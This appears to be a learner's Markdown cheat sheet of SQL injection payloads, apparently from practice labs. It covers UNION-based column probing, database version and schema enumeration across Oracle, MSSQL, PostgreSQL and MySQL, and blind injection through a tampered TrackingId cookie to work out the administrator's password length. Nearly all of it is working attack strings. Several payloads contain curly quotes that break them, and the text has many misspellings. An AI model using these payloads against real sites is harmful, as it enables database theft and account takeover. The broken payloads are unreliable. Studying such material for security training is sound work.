# SQL Injection

### How to check column in table query

Injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
```
' ORDER BY 1 -- 
' ORDER BY 2 --
' ORDER BY 3 --
```

### Finding columns with a useful data type

Having already determined the number of required columns, you can probe each column to test whether it can 
hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn.
```
' UNION SELECT ‘a’,NULL,NULL,NULL --
' UNION SELECT NULL,’a’,NULL,NULL -- 
' UNION SELECT NULL,NULL,’a’,NULL --
' UNION SELECT NULL,NULL,NULL,’a’ --
```
 - When determining the sata type from an *Oricle* database you will need to use the from clause. 
    - Example: `' UNION SELECT ‘a’,NULL FROM DUAL--`

## Database version
### You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

- Oracle: 	`SELECT banner FROM v$version` or `SELECT version FROM v$instance`
  > Example: `' UNION SELECT banner,NULL FROM v$version--`
- Microsoft: 	`SELECT @@version`
- PostgreSQL: 	`SELECT version()` 
  > Example: `'+UNION+SELECT+version()+,NULL--`
- MySQL: 	`SELECT @@version`

## Database contents
### You can list the tables that exist in the database, and the columns that those tables contain.

- Oracle
  - `SELECT * FROM all_tables`
    > Example: `' UNION SELECT TABLE_NAME,NULL FROM all_tables--`
    >> *table_name* is a sql_identifier that displays the name(s) of the table(s)
  - `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
    > Example: `' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_QQGUCL'--`
    >> *column_name* is a	sql_identifier that displays the name(s) of the column(s) under a specified table 
- Microsoft	
  - `SELECT * FROM information_schema.tables`
  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
- PostgreSQL	
  - `SELECT * FROM information_schema.tables`
    > Example: `' UNION SELECT table_name,NULL FROM information_schema.tables--` 
    >> *table_name* is a sql_identifier that displays the name(s) of the table(s)
  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` 
    > Example: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_jrcoia'--`
    >> *column_name* is a	sql_identifier that displays the name(s) of the column(s) under a specified table 
- MySQL	
  - `SELECT * FROM information_schema.tables`
  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

# Blind SQL Injection

### Test to see if application is vulnerable to blind SQLi
Force a true statement buy injectiong `' and 1=1--` (true) and `' and 1=2--` (false) at the end of the tracking id to see how the application responds to a true statement and a false statement. We can use the difference in how the application responds to gather information about the system.
> Example `Cookie: TrackingId=Tz8WopT2zdfF3ayw' and 1=1--; session=3NYJZxhVb8RYO3dnt4ia4hYVL8zidlNQ` true message
> Example `Cookie: TrackingId=Tz8WopT2zdfF3ayw' and 1=2--; session=3NYJZxhVb8RYO3dnt4ia4hYVL8zidlNQ` false message

#### Example qureies on how to inject code for information in blind SQLi
- `' and (select 'x' from users LIMIT 1)='x'--` This quiere states that if there is a users_table return x. If there is a users_table then we will get a true response back, if there is no users_table then we will get a false response back.
- `' and (select username from users where username='administrator')='administrator'--` If the first quiere returns true and there is a users table then we can also send this queire to see if there is an administrators account in the users_table

#### Password enumeration with blind SQLi
1. Find out the length of the password: `' and (select username from users where username='administrator' and LENGTH (password)>1)='administrator'--` This quiere returns true if the password length is grater than 1. Increase the lenght number after every true message untill you get a false message indicating the passowrd length 
> Example: This set of quereies indicated that the password lenght is 16 characters long
```
`' and (select username from users where username='administrator' and LENGTH (password)>14)='administrator'--` true
`' and (select username from users where username='administrator' and LENGTH (password)>15)='administrator'--` true
`' and (select username from users where username='administrator' and LENGTH (password)>16)='administrator'--` flase
```





